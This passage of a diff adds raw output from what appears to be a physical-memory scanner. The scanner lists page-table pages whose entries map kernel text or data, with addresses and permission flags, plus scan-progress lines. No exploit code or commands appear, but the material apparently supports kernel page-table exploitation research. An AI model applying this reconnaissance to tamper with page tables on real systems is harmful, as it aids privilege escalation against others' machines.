+    [167] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4615000: 183 present entries, 0 kdata refs, 1 ktext refs
+    [140] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4617000: 173 present entries, 0 kdata refs, 1 ktext refs
+    [276] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x462b000: 236 present entries, 0 kdata refs, 1 ktext refs
+    [ 67] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x462e000: 157 present entries, 0 kdata refs, 1 ktext refs
+    [311] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x462f000: 192 present entries, 0 kdata refs, 1 ktext refs
+    [165] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4635000: 222 present entries, 0 kdata refs, 1 ktext refs
+    [136] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4690000: 234 present entries, 0 kdata refs, 2 ktext refs
+    [430] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [439] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4695000: 176 present entries, 0 kdata refs, 1 ktext refs
+    [340] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x469b000: 234 present entries, 0 kdata refs, 1 ktext refs
+    [397] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x469f000: 194 present entries, 0 kdata refs, 1 ktext refs
+    [177] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x46c5000: 210 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x46d5000: 194 present entries, 0 kdata refs, 1 ktext refs
+    [101] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x46e3000: 225 present entries, 0 kdata refs, 1 ktext refs
+    [229] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x46e6000: 260 present entries, 0 kdata refs, 1 ktext refs
+    [302] 0x000000001100002f → PA=0x11000000 4KB RW User X
+
+[!] PT page at PA 0x475b000: 68 present entries, 0 kdata refs, 1 ktext refs
+    [509] 0x0000000011111111 → PA=0x11111000 4KB RO Kern X
+
+[!] PT page at PA 0x4791000: 260 present entries, 1 kdata refs, 1 ktext refs
+    [429] 0xe800000012bfd875 → PA=0x12bfd000 4KB RO User NX
+
+[!] PT page at PA 0x47f5000: 32 present entries, 2 kdata refs, 2 ktext refs
+    [214] 0x0000000012026567 → PA=0x12026000 4KB RW User X
+    [216] 0x0000000012027467 → PA=0x12027000 4KB RW User X
+
+[!] PT page at PA 0x489c000: 219 present entries, 0 kdata refs, 2 ktext refs
+    [139] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [213] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x48e8000: 193 present entries, 0 kdata refs, 2 ktext refs
+    [137] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [151] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x494c000: 200 present entries, 1 kdata refs, 1 ktext refs
+    [ 26] 0xc500000012ba015d → PA=0x12ba0000 4KB RO User NX
+
+[!] PT page at PA 0x497d000: 187 present entries, 0 kdata refs, 3 ktext refs
+    [307] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [346] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [451] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x498e000: 186 present entries, 0 kdata refs, 2 ktext refs
+    [392] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [480] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4991000: 163 present entries, 0 kdata refs, 1 ktext refs
+    [430] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x49ac000: 204 present entries, 0 kdata refs, 1 ktext refs
+    [459] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x49af000: 227 present entries, 0 kdata refs, 1 ktext refs
+    [149] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x49d0000: 226 present entries, 0 kdata refs, 1 ktext refs
+    [196] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x49f1000: 185 present entries, 0 kdata refs, 1 ktext refs
+    [172] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x49f6000: 189 present entries, 0 kdata refs, 2 ktext refs
+    [ 15] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [ 79] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x49f9000: 248 present entries, 1 kdata refs, 1 ktext refs
+    [181] 0xe800000011bac875 → PA=0x11bac000 4KB RO User NX
+
+[!] PT page at PA 0x4c3d000: 218 present entries, 0 kdata refs, 1 ktext refs
+    [277] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4d11000: 206 present entries, 0 kdata refs, 1 ktext refs
+    [396] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4d13000: 230 present entries, 0 kdata refs, 1 ktext refs
+    [195] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4d2c000: 197 present entries, 0 kdata refs, 2 ktext refs
+    [215] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [343] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4d2d000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [273] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4d51000: 183 present entries, 0 kdata refs, 1 ktext refs
+    [414] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4d71000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [435] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4e98000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [ 46] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4f85000: 230 present entries, 0 kdata refs, 1 ktext refs
+    [ 26] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4f86000: 167 present entries, 0 kdata refs, 1 ktext refs
+    [275] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4f95000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [197] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4f9e000: 192 present entries, 0 kdata refs, 1 ktext refs
+    [207] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4fba000: 220 present entries, 0 kdata refs, 2 ktext refs
+    [ 10] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [409] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4fbd000: 186 present entries, 0 kdata refs, 1 ktext refs
+    [193] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x4fc7000: 75 present entries, 0 kdata refs, 2 ktext refs
+    [ 81] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [116] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0x4ff4000: 231 present entries, 0 kdata refs, 1 ktext refs
+    [138] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5846000: 176 present entries, 0 kdata refs, 1 ktext refs
+    [133] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x585d000: 191 present entries, 0 kdata refs, 2 ktext refs
+    [137] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [169] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5877000: 173 present entries, 0 kdata refs, 1 ktext refs
+    [261] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5899000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [ 64] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x589a000: 195 present entries, 0 kdata refs, 3 ktext refs
+    [ 41] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [389] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [451] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x58d4000: 209 present entries, 0 kdata refs, 1 ktext refs
+    [266] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a16000: 223 present entries, 0 kdata refs, 1 ktext refs
+    [448] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a17000: 212 present entries, 0 kdata refs, 2 ktext refs
+    [161] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a1e000: 197 present entries, 0 kdata refs, 1 ktext refs
+    [397] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a1f000: 205 present entries, 0 kdata refs, 1 ktext refs
+    [179] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a45000: 183 present entries, 0 kdata refs, 1 ktext refs
+    [ 13] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a47000: 198 present entries, 0 kdata refs, 1 ktext refs
+    [341] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a6d000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [394] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a72000: 214 present entries, 0 kdata refs, 1 ktext refs
+    [157] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a77000: 217 present entries, 0 kdata refs, 1 ktext refs
+    [389] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5a7b000: 59 present entries, 0 kdata refs, 1 ktext refs
+    [497] 0x0000000011111111 → PA=0x11111000 4KB RO Kern X
+
+[!] PT page at PA 0x5a84000: 224 present entries, 0 kdata refs, 1 ktext refs
+    [139] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5b5e000: 253 present entries, 0 kdata refs, 2 ktext refs
+    [257] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [432] 0x0000000010ca44c7 → PA=0x10ca4000 2MB RW User X
+
+[!] PT page at PA 0x5b5f000: 209 present entries, 0 kdata refs, 3 ktext refs
+    [206] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+    [389] 0x0000000010c244c7 → PA=0x10c24000 2MB RW User X
+    [471] 0x0000000010c144c7 → PA=0x10c14000 2MB RW User X
+
+[!] PT page at PA 0x5bca000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [137] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5bcb000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [264] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5c00000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [451] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5c03000: 216 present entries, 0 kdata refs, 1 ktext refs
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5c24000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [168] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5c32000: 182 present entries, 0 kdata refs, 1 ktext refs
+    [278] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5c55000: 222 present entries, 0 kdata refs, 2 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [407] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5c5a000: 202 present entries, 0 kdata refs, 2 ktext refs
+    [137] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [215] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5c7d000: 223 present entries, 0 kdata refs, 2 ktext refs
+    [419] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [433] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5cbe000: 180 present entries, 0 kdata refs, 1 ktext refs
+    [324] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5cbf000: 179 present entries, 0 kdata refs, 1 ktext refs
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5cf0000: 185 present entries, 0 kdata refs, 2 ktext refs
+    [134] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [212] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x5d42000: 60 present entries, 0 kdata refs, 2 ktext refs
+    [153] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [188] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0x5d45000: 73 present entries, 0 kdata refs, 2 ktext refs
+    [466] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [501] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0x5d73000: 184 present entries, 0 kdata refs, 1 ktext refs
+    [ 11] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6083000: 197 present entries, 0 kdata refs, 1 ktext refs
+    [134] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6092000: 180 present entries, 0 kdata refs, 1 ktext refs
+    [329] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6093000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [343] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x60d8000: 170 present entries, 0 kdata refs, 4 ktext refs
+    [  9] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [151] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [266] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [280] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x60dd000: 229 present entries, 1 kdata refs, 2 ktext refs
+    [337] 0x0010000011460747 → PA=0x11460000 4KB RW User X
+    [472] 0x0010000012170813 → PA=0x12170000 4KB RW Kern X
+
+[!] PT page at PA 0x6174000: 173 present entries, 0 kdata refs, 2 ktext refs
+    [185] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [236] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6183000: 194 present entries, 0 kdata refs, 2 ktext refs
+    [136] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [150] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x61c9000: 198 present entries, 0 kdata refs, 1 ktext refs
+    [452] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x61d1000: 222 present entries, 0 kdata refs, 1 ktext refs
+    [403] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x61d3000: 193 present entries, 0 kdata refs, 2 ktext refs
+    [405] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [478] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x61d4000: 127 present entries, 0 kdata refs, 1 ktext refs
+    [ 67] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x61f4000: 191 present entries, 0 kdata refs, 1 ktext refs
+    [448] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x61f5000: 191 present entries, 0 kdata refs, 1 ktext refs
+    [ 64] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x61f6000: 175 present entries, 0 kdata refs, 2 ktext refs
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [448] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x629a000: 204 present entries, 0 kdata refs, 1 ktext refs
+    [  7] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x63c7000: 202 present entries, 0 kdata refs, 1 ktext refs
+    [269] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6408000: 163 present entries, 0 kdata refs, 2 ktext refs
+    [180] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [212] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6409000: 192 present entries, 0 kdata refs, 1 ktext refs
+    [343] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x640b000: 211 present entries, 0 kdata refs, 1 ktext refs
+    [390] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x642f000: 167 present entries, 0 kdata refs, 1 ktext refs
+    [ 49] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x644a000: 70 present entries, 0 kdata refs, 1 ktext refs
+    [ 41] 0x0000000011900303 → PA=0x11900000 4KB RW Kern X
+
+[!] PT page at PA 0x647e000: 215 present entries, 1 kdata refs, 0 ktext refs
+    [190] 0x0000000012f8f621 → PA=0x12f8f000 4KB RO Kern X
+
+[!] PT page at PA 0x64ef000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [122] 0x0000000011000219 → PA=0x11000000 4KB RO Kern X
+
+[!] PT page at PA 0x6589000: 229 present entries, 2 kdata refs, 0 ktext refs
+    [247] 0x4900000011840fdb → PA=0x11840000 2MB RW Kern X
+    [358] 0x4900000011840fdb → PA=0x11840000 2MB RW Kern X
+
+[!] PT page at PA 0x65f4000: 229 present entries, 0 kdata refs, 1 ktext refs
+    [ 10] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6778000: 4 present entries, 0 kdata refs, 2 ktext refs
+    [ 46] 0x0000000011564f7b → PA=0x11564000 4KB RW Kern X
+    [ 48] 0x0000000011569557 → PA=0x11569000 4KB RW User X
+
+[!] PT page at PA 0x6833000: 203 present entries, 0 kdata refs, 1 ktext refs
+    [ 49] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x683c000: 202 present entries, 0 kdata refs, 4 ktext refs
+    [  9] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [263] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [320] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [396] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x683f000: 192 present entries, 0 kdata refs, 1 ktext refs
+    [192] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6841000: 161 present entries, 0 kdata refs, 1 ktext refs
+    [186] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x684d000: 208 present entries, 0 kdata refs, 2 ktext refs
+    [436] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [468] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6851000: 214 present entries, 0 kdata refs, 1 ktext refs
+    [138] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6858000: 219 present entries, 0 kdata refs, 1 ktext refs
+    [300] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6859000: 207 present entries, 0 kdata refs, 2 ktext refs
+    [157] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [167] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x685a000: 213 present entries, 0 kdata refs, 2 ktext refs
+    [ 31] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [416] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x685d000: 194 present entries, 0 kdata refs, 1 ktext refs
+    [416] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6862000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [412] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6863000: 183 present entries, 0 kdata refs, 1 ktext refs
+    [438] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x686f000: 218 present entries, 0 kdata refs, 1 ktext refs
+    [ 64] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x68b1000: 198 present entries, 0 kdata refs, 1 ktext refs
+    [159] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x68b3000: 188 present entries, 0 kdata refs, 1 ktext refs
+    [307] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6a07000: 223 present entries, 0 kdata refs, 2 ktext refs
+    [393] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [406] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6a10000: 224 present entries, 0 kdata refs, 1 ktext refs
+    [407] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6a12000: 194 present entries, 0 kdata refs, 2 ktext refs
+    [ 52] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [161] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6a61000: 240 present entries, 0 kdata refs, 1 ktext refs
+    [416] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6a63000: 221 present entries, 0 kdata refs, 1 ktext refs
+    [421] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6a78000: 222 present entries, 0 kdata refs, 1 ktext refs
+    [135] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6ac5000: 211 present entries, 0 kdata refs, 1 ktext refs
+    [ 12] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6acb000: 174 present entries, 0 kdata refs, 1 ktext refs
+    [165] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6ada000: 200 present entries, 0 kdata refs, 2 ktext refs
+    [329] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [343] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6adb000: 212 present entries, 0 kdata refs, 2 ktext refs
+    [257] 0x0000000011000401 → PA=0x11000000 4KB RO Kern X
+    [357] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6adc000: 211 present entries, 0 kdata refs, 1 ktext refs
+    [158] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6aff000: 152 present entries, 0 kdata refs, 1 ktext refs
+    [  7] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6b2b000: 221 present entries, 0 kdata refs, 1 ktext refs
+    [ 52] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6b9a000: 201 present entries, 0 kdata refs, 1 ktext refs
+    [ 14] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6bf9000: 242 present entries, 1 kdata refs, 1 ktext refs
+    [358] 0x4800000011be0007 → PA=0x11be0000 4KB RW User X
+
+[!] PT page at PA 0x6bfb000: 209 present entries, 1 kdata refs, 1 ktext refs
+    [335] 0xe800000011be0007 → PA=0x11be0000 4KB RW User NX
+
+[!] PT page at PA 0x6d6a000: 206 present entries, 0 kdata refs, 2 ktext refs
+    [  9] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [265] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6d6b000: 202 present entries, 0 kdata refs, 1 ktext refs
+    [ 16] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6da6000: 200 present entries, 0 kdata refs, 1 ktext refs
+    [436] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6daa000: 184 present entries, 0 kdata refs, 1 ktext refs
+    [320] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6dab000: 153 present entries, 0 kdata refs, 1 ktext refs
+    [194] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6ded000: 211 present entries, 0 kdata refs, 1 ktext refs
+    [ 10] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6dee000: 177 present entries, 0 kdata refs, 1 ktext refs
+    [351] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0x6def000: 206 present entries, 0 kdata refs, 1 ktext refs
+    [335] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    Scan: 128MB/512MB (32768 OK, 0 blocked, 226 PT refs found)
+    Scan: 192MB/512MB (49152 OK, 0 blocked, 226 PT refs found)
+
+[!] PT page at PA 0xd702000: 168 present entries, 0 kdata refs, 1 ktext refs
+    [ 22] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd734000: 176 present entries, 0 kdata refs, 1 ktext refs
+    [323] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd739000: 212 present entries, 0 kdata refs, 1 ktext refs
+    [196] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd760000: 178 present entries, 0 kdata refs, 2 ktext refs
+    [ 68] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [452] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd76a000: 214 present entries, 0 kdata refs, 1 ktext refs
+    [288] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd774000: 230 present entries, 0 kdata refs, 1 ktext refs
+    [271] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd790000: 230 present entries, 0 kdata refs, 1 ktext refs
+    [436] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd793000: 218 present entries, 0 kdata refs, 1 ktext refs
+    [141] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd798000: 230 present entries, 0 kdata refs, 1 ktext refs
+    [148] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd7b0000: 194 present entries, 0 kdata refs, 1 ktext refs
+    [ 67] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd7b2000: 208 present entries, 0 kdata refs, 1 ktext refs
+    [143] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd7b7000: 225 present entries, 0 kdata refs, 1 ktext refs
+    [141] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd7bf000: 224 present entries, 0 kdata refs, 2 ktext refs
+    [175] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+    [218] 0x0000000011010101 → PA=0x11010000 4KB RO Kern X
+
+[!] PT page at PA 0xd82a000: 69 present entries, 0 kdata refs, 2 ktext refs
+    [ 36] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [ 71] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd82b000: 81 present entries, 0 kdata refs, 2 ktext refs
+    [ 46] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [ 81] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd859000: 67 present entries, 0 kdata refs, 2 ktext refs
+    [112] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [147] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd890000: 76 present entries, 0 kdata refs, 2 ktext refs
+    [ 82] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+    [117] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
+
+[!] PT page at PA 0xd892000: 54 present entries, 0 kdata refs, 2 ktext refs
+    [250] 0x00000000117fed71 → PA=0x117fe000 4KB RO Kern X
